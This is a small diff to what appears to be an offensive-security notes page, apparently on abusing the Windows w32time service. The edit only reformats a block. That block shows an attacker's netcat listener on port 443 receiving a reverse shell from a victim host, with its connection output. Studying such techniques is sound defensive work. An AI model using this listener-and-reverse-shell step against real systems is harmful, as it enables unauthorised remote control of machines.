@@ -33,16 +33,14 @@ SERVICE_NAME: w32time
 
 Attacker receiving a reverse shell:
 
-{% tabs %}
-{% tab title="attacker@local" %}
+{% code title="attacker@local" %}
 ```csharp
 root@~# nc -lvvp 443
 listening on [any] 443 ...
 10.0.0.2: inverse host lookup failed: Unknown host
 connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 64634
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## Observations
 
